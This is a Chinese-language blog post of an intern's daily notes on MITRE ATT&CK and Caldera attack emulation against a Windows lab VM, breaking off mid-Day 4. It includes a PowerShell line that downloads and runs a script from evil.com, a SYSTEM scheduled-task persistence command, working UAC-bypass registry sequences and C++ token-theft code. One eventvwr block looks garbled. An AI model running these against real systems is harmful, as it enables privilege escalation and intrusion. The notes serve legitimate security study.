<!DOCTYPE html><html lang="zh-tw" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>中研院資訊所暑期實習 | 烏鴉囈語</title><meta name="author" content="烏鴉先生"><meta name="copyright" content="烏鴉先生"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="中研院資訊所暑期實習前言 申請 實習札記Day 1 不想早起   因為是第一天怕遲到，早上六點半就起床去搭高鐵，結果早了快一個小時到，通勤時間約為一個半小時上午都在On board，行政效率非常之好mentor簡單介紹了前兩週的準備工作      Note of today About Mittre ATT&amp;CK framework ATT&amp;CK The MITRE ATT&amp;amp">
<meta property="og:type" content="article">
<meta property="og:title" content="中研院資訊所暑期實習">
<meta property="og:url" content="http://withoutdirection.github.io/2025/07/01/sinica-cs-summer-internship/index.html">
<meta property="og:site_name" content="烏鴉囈語">
<meta property="og:description" content="中研院資訊所暑期實習前言 申請 實習札記Day 1 不想早起   因為是第一天怕遲到，早上六點半就起床去搭高鐵，結果早了快一個小時到，通勤時間約為一個半小時上午都在On board，行政效率非常之好mentor簡單介紹了前兩週的準備工作      Note of today About Mittre ATT&amp;CK framework ATT&amp;CK The MITRE ATT&amp;amp">
<meta property="og:locale" content="zh_TW">
<meta property="og:image" content="http://withoutdirection.github.io/img/crow.webp">
<meta property="article:published_time" content="2025-06-30T16:00:00.000Z">
<meta property="article:modified_time" content="2025-07-08T08:38:02.077Z">
<meta property="article:author" content="烏鴉先生">
<meta property="article:tag" content="電腦安全">
<meta property="article:tag" content="實習">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://withoutdirection.github.io/img/crow.webp"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "中研院資訊所暑期實習",
  "url": "http://withoutdirection.github.io/2025/07/01/sinica-cs-summer-internship/",
  "image": "http://withoutdirection.github.io/img/crow.webp",
  "datePublished": "2025-06-30T16:00:00.000Z",
  "dateModified": "2025-07-08T08:38:02.077Z",
  "author": [
    {
      "@type": "Person",
      "name": "烏鴉先生",
      "url": "https://withoutdirection.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://withoutdirection.github.io/2025/07/01/sinica-cs-summer-internship/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          const hour = new Date().getHours()
          const isNight = hour <= 6 || hour >= 17
          if (theme === undefined) isNight ? activateDarkMode() : activateLightMode()
          else theme === 'light' ? activateLightMode() : activateDarkMode()
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '中研院資訊所暑期實習',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/modify.css"><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="烏鴉囈語" type="application/atom+xml">
</head><body><div id="web_bg" style="background-image: url(img/forest.webp);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/crow.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 檔案</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> about</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: 縮略圖;"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/logo.webp" alt="Logo"><span class="site-name">烏鴉囈語</span></a><a class="nav-page-title" href="/"><span class="site-name">中研院資訊所暑期實習</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 檔案</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> about</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">中研院資訊所暑期實習</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-06-30T16:00:00.000Z" title="Created 2025-07-01 00:00:00">2025-07-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-07-08T08:38:02.077Z" title="Updated 2025-07-08 16:38:02">2025-07-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E8%B3%87%E5%B7%A5/">資工</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image: url(undefined);"></div><article class="container post-content" id="article-container"><h1 id="中研院資訊所暑期實習"><a href="#中研院資訊所暑期實習" class="headerlink" title="中研院資訊所暑期實習"></a>中研院資訊所暑期實習</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr>
<h2 id="申請"><a href="#申請" class="headerlink" title="申請"></a>申請</h2><hr>
<h2 id="實習札記"><a href="#實習札記" class="headerlink" title="實習札記"></a>實習札記</h2><h3 id="Day-1"><a href="#Day-1" class="headerlink" title="Day 1"></a>Day 1</h3><details>
<summary>不想早起</summary>

<blockquote>
<p>因為是第一天怕遲到，早上六點半就起床去搭高鐵，結果早了快一個小時到，通勤時間約為一個半小時<br>上午都在On board，行政效率非常之好<br>mentor簡單介紹了前兩週的準備工作 </p>
</blockquote>
</details>

<ul>
<li>Note of today<ul>
<li>About Mittre ATT&amp;CK framework<ul>
<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/">ATT&amp;CK</a></li>
<li>The MITRE ATT&amp;CK framework is a globally accessible knowledge base of adversary tactics$<em>\text{攻擊目的}$ and techniques$</em>\text{使用的手法}$ based on <strong>real-world observations</strong>.</li>
</ul>
</li>
</ul>
</li>
<li>Today’s achievements:<ul>
<li><input checked="" disabled="" type="checkbox"> 完成On board</li>
<li><input checked="" disabled="" type="checkbox"> Caldera server establishment</li>
<li><input disabled="" type="checkbox"> Windows VM (act as a victim) setup</li>
</ul>
</li>
</ul>
<h3 id="Day-2"><a href="#Day-2" class="headerlink" title="Day 2"></a>Day 2</h3><details>
<summary>因為買咖啡遲到</summary>

<blockquote>
<p>今天起得比較晚，結果因為想買中研院外面的咖啡所以遲到，如果要吃早餐的話應該要六點半起床，帶去實驗室邊吃邊工作可以多睡半小時<br>誰上班第二天就遲到，我<br>但今天做好多事情，有點不知道明天還可以幹嘛</p>
</blockquote>
</details>

<ul>
<li><p>Note of today</p>
<ul>
<li>Deploy a Caldera agent on Windows VM<ol>
<li>Copy the psh script to the Windows VM</li>
<li>Run the script to install the agent</li>
<li>Check the agent status in the Caldera server</li>
</ol>
</li>
<li>Create a new operation with existed adversary profile<ul>
<li>The adversary profile is a set of tactics and techniques that the adversary is expected to use</li>
<li>The operation is a set of tasks that the adversary will perform on the victim machine</li>
<li>The operation can be run on the Caldera server to simulate the attack</li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/sectool/348940.html">Windows worm#1</a><ul>
<li>目前VM配置不符合攻擊設定</li>
<li>等熟悉Caldera後再來研究這個攻擊手法</li>
</ul>
</li>
<li>Techniques that would be used in the “Discovery” tactics in Windows System  <ul>
<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/tactics/TA0007/">Attack Discovery</a><ul>
<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1087/001/">Local Account</a> <ul>
<li>E.g. Milan has run <code>C:\Windows\system32\cmd.exe /c cmd /c dir c:\users\ /s 2&gt;&amp;1</code> to discover local accounts.</li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1087/002/">Domain Account</a><ul>
<li>E.g. Chimera has has used <code>net user /dom</code> and <code>net user Administrator</code> to enumerate domain accounts including administrator accounts.</li>
<li><blockquote>
<p>在自己做指令測試的時候發現 <code>NET HELPMSG ****</code> 能用來解析 NET 命令的錯誤訊息</p>
</blockquote>
</li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1087/003/">Email Accounts</a><ul>
<li>Backdoor.Oldrea collects address book information from Outlook.</li>
</ul>
</li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1010/">Application Window Discovery</a><ul>
<li>E.g.  <code>tasklist /v /fo csv</code> to discover the application windows on the victim machine.</li>
<li><blockquote>
<p>大部分的攻擊需要有安裝外掛或是套件才能藉由這個指令來取得應用程式視窗資訊，單純的指令較少</p>
</blockquote>
</li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1201/">Password Policy Discovery</a> <ul>
<li><blockquote>
<p>可以用來幫助攻擊者創建通用密碼的列表，並啟動符合策略的詞典和/或蠻力攻擊</p>
</blockquote>
</li>
<li>The <code>net accounts</code> and <code>net accounts /domain</code> commands with Net can be used to obtain password policy information.</li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="http://attack.mitre.org/techniques/T1069/">Permission Group Discovery</a><ul>
<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1069/001/">Local Groups</a><ul>
<li>E.g. Chimera has used <code>net localgroup administrators</code> to identify accounts with local administrative rights.</li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1069/002/">Domain Groups</a><ul>
<li>BADHATCH can use <code>net.exe group "domain admins" /domain</code> to identify Domain Administrators.  </li>
<li><blockquote>
<p>Group相關的指令只能在有Domain的環境下使用，否則會出現錯誤訊息</p>
</blockquote>
</li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1082/">System Information Discovery</a><ul>
<li>E.g. APT41 uses multiple built-in commands such as <code>systeminfo</code> and <code>net config Workstation</code> to enumerate victim system basic configuration information.  </li>
<li>E.g. APT1 used the <code>ipconfig /all</code> command to gather network configuration information.</li>
<li>E.g. An APT3 downloader uses the Windows command <code>"cmd.exe" /C whoami</code> to verify that it is running with the elevated privileges of “System.</li>
<li>E.g. APT1 used the commands <code>net start</code> and <code>tasklist</code> to get a listing of the services on the system.</li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1518/">Software Discovery</a><ul>
<li>Get a list of all installed programs and their versions (<code>wmic product get name,version</code>). This list is then checked against public databases for known vulnerabilities.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>Today’s achievements:</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> Windows VM (act as a victim) setup and deploy a Caldera agent<ul>
<li>會需要把Windows的防火牆、自動掃描、防毒軟體關掉，否則agent會不能正確載入</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> Implement a new adversary profile and execute the operation <ul>
<li>Operation: Windows worm#1: 未成功</li>
<li>Operation: Noisy neighbor: 成功，但由於VM是ethernet，所以攻擊wifi看不出來有沒有在做事</li>
<li>Operation: Collection: 成功， 於C:\Windows\System32 建立資料夾”Staged”</li>
<li>Operation: Discovery: 成功，但有部分指令(Discover domain controller/  antivirus programs)無法執行</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> Read “Discovery” tatics and related techniques in ATT&amp;CK framework<ul>
<li>超多</li>
<li>謝謝AI幫我整理重點</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> Find the LOG in the agent after the operation is executed<ul>
<li>Operations執行後會在Event Viewer中的 <strong>Application and Services Logs</strong> 中的 <strong>Windows Powershell</strong> 找到相關的LOG</li>
<li>且，在<strong>Applications and Services Logs → Microsoft → Windows → PowerShell → Operational</strong> 有更詳細的LOG</li>
<li>在 <code>C:\Windows\Prefetch</code>裡會留下執行過的指令的記錄，但需要特定的程式才能解析其內容</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Day-3"><a href="#Day-3" class="headerlink" title="Day 3"></a>Day 3</h3><details>
<summary>很多聊天(Meeting)</summary>

<blockquote>
<p>教授都出國，家裡沒大人<br>三位學長姐分別報了他們的進度，然後下午在樓下大聊特聊跟認識實驗室其他人</p>
</blockquote>
</details>

<ul>
<li><p>Note of today</p>
<ul>
<li>About Meeting<ol>
<li>AI agent to planning a cyberattack by prompting a CTI Report</li>
<li>Sandbox detection evasion<ol>
<li>Inverse compile the maleware and use transformer to generate the fumction relation graph</li>
</ol>
</li>
<li>Maleware log analysis and sort them into a Mitre ATT&amp;CK framework</li>
</ol>
</li>
<li>“Execution” tatics and related techniques in ATT&amp;CK framework<ul>
<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/tactics/TA0002/">Execution</a><ul>
<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1059/">Command and Scripting Interpreter</a><ul>
<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1059/001/">PowerShell</a><ul>
<li>PowerShell is a primary tool for attackers due to its power and integration with Windows.</li>
<li>Fileless Execution: Download and run code directly in memory.<ul>
<li><code>IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')</code></li>
</ul>
</li>
<li>E.g. APT3 has used PowerShell on victim systems to download and run payloads after exploitation.</li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1059/003/">Windows Command Shell</a><ul>
<li>The standard <strong>cmd.exe</strong> is used for direct command execution and running batch scripts. </li>
<li>E.g. AuTo Stealer can use <strong>cmd.exe</strong> to execute a created batch file.</li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1059/006/">Python</a> <ul>
<li>Python comes with many built-in packages to interact with the underlying system, such as file operations and device I/O.</li>
<li>E.g. APT39 has used a command line utility and a network scanner written in python.</li>
<li><blockquote>
<p>在Os上執行Python需要先安裝Python，且需要在PATH中設定Python的路徑</p>
</blockquote>
</li>
<li><blockquote>
<p>因此若Victim系統沒有安裝Python，則無法使用此技術</p>
</blockquote>
</li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1059/005/">Visual Basic</a><ul>
<li>VB is most often abused through macros in Microsoft Office documents.</li>
<li>E.g. APT37 executes shellcode and a VBA script to decode Base64 strings.</li>
</ul>
</li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1047/">Windows Management Instrumentation</a><ul>
<li>WMI is a powerful administrative feature that can be abused to execute code locally or remotely without dropping a file.</li>
<li>Direct Command: Use the wmic utility to start a process.<ul>
<li><code>wmic process call create "calc.exe"</code></li>
<li>E.g. APT29 used WMI to steal credentials and execute backdoors at a future time.</li>
</ul>
</li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1053/">Scheduled Tasks</a><ul>
<li>Attackers use the Windows Task Scheduler to execute code at specific times or in response to system events, which is a common persistence method.</li>
<li>CLI: Use the schtasks.exe utility.<ul>
<li><code>schtasks /create /tn "Updater" /tr "c:\temp\evil.exe" /sc onlogon /ru "SYSTEM"   </code></li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1053/005/">Scheduled Task</a>  <ul>
<li>An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence.</li>
<li>E.g. An APT3 downloader creates persistence by creating the following scheduled task: <code>schtasks /create /tn "mysc" /tr C:\Users\Public\test.exe /sc ONLOGON /ru "System"</code>.</li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1053/002/">At</a><ul>
<li>Adversaries may abuse the at utility to perform task scheduling for initial or recurring execution of malicious code.</li>
<li>E.g. APT18 actors used the native at Windows task scheduler tool to use scheduled tasks for execution on a victim network.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Create an adversary with “Discovery” and “Execution” tactics<ul>
<li>沒想像中的簡單，很多ability需要特定的輸入與輸出</li>
</ul>
</li>
</ul>
</li>
<li><p>Achievements of today:</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> Read “Execution” tatics and related techniques in ATT&amp;CK framework</li>
<li><input checked="" disabled="" type="checkbox"> Create an adversary with “Discovery” and “Execution” tactics<ul>
<li>但還沒成功執行，可能是因為VM的設定問題</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> Meeting with mentor and other interns<ul>
<li>了解其他人的研究方向與進度 </li>
<li>與實驗室其他學長姐與實習生認識</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Day-4"><a href="#Day-4" class="headerlink" title="Day 4"></a>Day 4</h3><details>
<summary>誰邊上班邊看比賽</summary>

<blockquote>
<p>帶手沖咖啡來實驗室，實施咖啡外交<br>發現Mitre ATT&amp;CK每個Tatics的東西都多到爆炸，根本讀不完</p>
</blockquote>
</details>

<ul>
<li><p>Note of today</p>
  <details>
  <summary>
  Privilege Escalation 技術與實作整理（ATT&amp;CK Framework）
  </summary>

<h4 id="1-濫用權限提升控制機制-Abuse-Elevation-Control-Mechanism"><a href="#1-濫用權限提升控制機制-Abuse-Elevation-Control-Mechanism" class="headerlink" title="1. 濫用權限提升控制機制 (Abuse Elevation Control Mechanism)"></a>1. 濫用權限提升控制機制 (Abuse Elevation Control Mechanism)</h4><p>  <strong>UAC繞過技術：</strong></p>
<table>
<thead>
<tr>
<th>方法</th>
<th>原理/說明</th>
<th>實作步驟</th>
</tr>
</thead>
<tbody><tr>
<td>fodhelper.exe</td>
<td>利用自動提升權限特性</td>
<td></td>
</tr>
<tr>
<td><figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "<span class="built_in">cmd</span>.exe" /f</span><br><span class="line">reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /t REG_SZ /d "" /f</span><br><span class="line">fodhelper.exe</span><br></pre></td></tr></tbody></table></figure></td>
<td></td>
<td></td>
</tr>
<tr>
<td>eventvwr.exe</td>
<td>登錄檔劫持</td>
<td></td>
</tr>
<tr>
<td><figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /t REG_SZ /d "C:\Windows\System32\<span class="built_in">cmd</span>.exe" /f</span><br><span class="line">reg add "HKCU\Software\Classes\mscfile\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f</span><br><span class="line">    $env:<span class="built_in">PATH</span> -split ';' | ForEach-Object { <span class="keyword">if</span> (Test-<span class="built_in">Path</span> $_) { Get-ChildItem $_ -File -Filter "*.dll" } }</span><br></pre></td></tr></tbody></table></figure></td>
<td></td>
<td></td>
</tr>
<tr>
<td>sdclt.exe</td>
<td>利用 isolation 功能</td>
<td></td>
</tr>
<tr>
<td><figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add "HKCU\Software\Classes\exefile\shell\runas\command" /ve /t REG_SZ /d "C:\Windows\System32\<span class="built_in">cmd</span>.exe" /f</span><br><span class="line">reg add "HKCU\Software\Classes\exefile\shell\runas\command" /v "IsolatedCommand" /t REG_SZ /d "C:\Windows\System32\<span class="built_in">cmd</span>.exe" /f</span><br><span class="line">sdclt.exe /KickOffElev</span><br></pre></td></tr></tbody></table></figure></td>
<td></td>
<td></td>
</tr>
<tr>
<td>ComputerDefaults.exe</td>
<td>利用自動提升權限</td>
<td></td>
</tr>
<tr>
<td><figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "powershell.exe" /f</span><br><span class="line">reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /t REG_SZ /d "" /f</span><br><span class="line">ComputerDefaults.exe</span><br></pre></td></tr></tbody></table></figure></td>
<td></td>
<td></td>
</tr>
<tr>
<td>COM 提升標識符</td>
<td>PowerShell 建立 COM 物件</td>
<td></td>
</tr>
<tr>
<td><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$com</span> = <span class="built_in">New-Object</span> <span class="literal">-ComObject</span> <span class="string">"Elevation:1!new:{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"</span></span><br><span class="line"><span class="variable">$com</span>.ExecuteCommand(<span class="string">"cmd.exe"</span>)</span><br></pre></td></tr></tbody></table></figure></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<hr>
<h4 id="2-存取權杖操控-Access-Token-Manipulation"><a href="#2-存取權杖操控-Access-Token-Manipulation" class="headerlink" title="2. 存取權杖操控 (Access Token Manipulation)"></a>2. 存取權杖操控 (Access Token Manipulation)</h4><p>  <strong>常見技術與範例：</strong></p>
<ul>
<li>權杖模擬/竊取  <figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 開啟目標處理程序</span></span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_QUERY_INFORMATION, FALSE, dwPID);</span><br><span class="line"><span class="comment">// 開啟處理程序權杖</span></span><br><span class="line">HANDLE hToken;</span><br><span class="line"><span class="built_in">OpenProcessToken</span>(hProcess, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &amp;hToken);</span><br><span class="line"><span class="comment">// 複製權杖</span></span><br><span class="line">HANDLE hDupToken;</span><br><span class="line"><span class="built_in">DuplicateToken</span>(hToken, SecurityImpersonation, &amp;hDupToken);</span><br><span class="line"><span class="comment">// 模擬權杖</span></span><br><span class="line"><span class="built_in">ImpersonateLoggedOnUser</span>(hDupToken);</span><br><span class="line"><span class="comment">// 使用權杖建立處理程序</span></span><br><span class="line"><span class="built_in">CreateProcessWithTokenW</span>(hDupToken, <span class="number">0</span>, <span class="string">L"cmd.exe"</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br></pre></td></tr></tbody></table></figure></li>
<li>Named Pipe 模擬  <figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hPipe = <span class="built_in">CreateNamedPipe</span>(<span class="string">L"\\.\\pipe\\test"</span>, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, <span class="number">1</span>, <span class="number">1024</span>, <span class="number">1024</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">ConnectNamedPipe</span>(hPipe, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">ImpersonateNamedPipeClient</span>(hPipe);</span><br></pre></td></tr></tbody></table></figure></li>
<li>SeDebugPrivilege 提升  <figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hToken;</span><br><span class="line"><span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken);</span><br><span class="line">TOKEN_PRIVILEGES tp;</span><br><span class="line">tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;tp.Privileges[<span class="number">0</span>].Luid);</span><br><span class="line">tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line"><span class="built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tp, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></tbody></table></figure></li>
